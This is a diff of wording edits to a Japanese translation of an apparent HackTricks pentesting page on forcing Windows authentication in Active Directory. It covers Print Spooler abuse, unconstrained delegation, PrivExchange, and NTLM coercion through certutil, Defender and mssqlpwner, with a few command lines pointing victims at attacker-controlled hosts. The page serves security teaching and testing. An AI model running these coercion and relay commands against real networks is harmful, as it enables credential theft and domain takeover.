@@ -8,8 +8,8 @@
 
 ## Spooler Service Abuse
 
-_**Print Spooler**_ サービスが**有効**な場合、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
-プリンターが任意のシステムに通知を送信する際には、その**システム**に対して**認証**を行う必要があります。したがって、攻撃者は_**Print Spooler**_ サービスを任意のシステムに対して認証させることができ、その認証では**コンピュータアカウント**が使用されます。
+もし_**Print Spooler**_サービスが**有効**であれば、既知のAD資格情報を使用してドメインコントローラーの印刷サーバーに新しい印刷ジョブの**更新**を**要求**し、**通知を任意のシステムに送信するように指示**できます。\
+プリンターが任意のシステムに通知を送信する際には、その**システム**に対して**認証**を行う必要があります。したがって、攻撃者は_**Print Spooler**_サービスを任意のシステムに対して認証させることができ、そのサービスはこの認証で**コンピュータアカウント**を使用します。
 
 ### Finding Windows Servers on the domain
 
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegationとの組み合わせ
 
-攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を持つコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者はすでにこのホストを侵害しているため、**このチケットを取得**し、悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。
+攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)でコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに対して認証させる**ことができます。制約のない委任のため、**プリンタのコンピュータアカウントのTGT**は、制約のない委任を持つコンピュータの**メモリ**に**保存されます**。攻撃者がすでにこのホストを侵害しているため、彼は**このチケットを取得し**、それを悪用することができます（[Pass the Ticket](pass-the-ticket.md)）。
 
 ## RCP強制認証
 
@@ -53,11 +53,11 @@ https://github.com/p0dalirius/Coercer
 
 `PrivExchange`攻撃は、**Exchange Serverの`PushSubscription`機能**に見つかった欠陥の結果です。この機能により、メールボックスを持つ任意のドメインユーザーがHTTP経由で任意のクライアント提供ホストに対してExchangeサーバーを強制的に認証させることができます。
 
-デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新に対してドメインのWriteDacl特権を持っています**）。この欠陥は、**情報をLDAPに中継し、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継および認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
+デフォルトでは、**ExchangeサービスはSYSTEMとして実行され**、過剰な特権が与えられています（具体的には、**2019年以前の累積更新のドメインに対するWriteDacl特権**があります）。この欠陥は、**LDAPへの情報の中継を可能にし、その後ドメインNTDSデータベースを抽出する**ために悪用できます。LDAPへの中継が不可能な場合でも、この欠陥はドメイン内の他のホストに中継して認証するために使用できます。この攻撃の成功した悪用は、認証された任意のドメインユーザーアカウントでドメイン管理者への即時アクセスを許可します。
 
 ## Windows内部
 
-Windowsマシンの内部にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます。
+Windowsマシンの内部にいる場合、特権アカウントを使用してサーバーに接続するようWindowsを強制することができます：
 
 ### Defender MpCmdRun
 ```bash
@@ -82,7 +82,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.25
 
 ### Certutil
 
-certutil.exe lolbin（Microsoft署名のバイナリ）を使用してNTLM認証を強制することが可能です:
+certutil.exe lolbin (Microsoft署名のバイナリ) を使用してNTLM認証を強制することが可能です:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
@@ -104,7 +104,7 @@ certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
 ## NTLMv1のクラッキング
 
-[NTLMv1チャレンジをキャプチャできる場合は、ここでそれらをクラッキングする方法を読んでください](../ntlm/index.html#ntlmv1-attack).\
-_&#x52;emember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+[NTLMv1チャレンジをキャプチャできる場合は、ここでそれらをクラッキングする方法を読んでください](../ntlm/index.html#ntlmv1-attack)。\
+_ NTLMv1をクラッキングするには、Responderチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_
 
 {{#include ../../banners/hacktricks-training.md}}
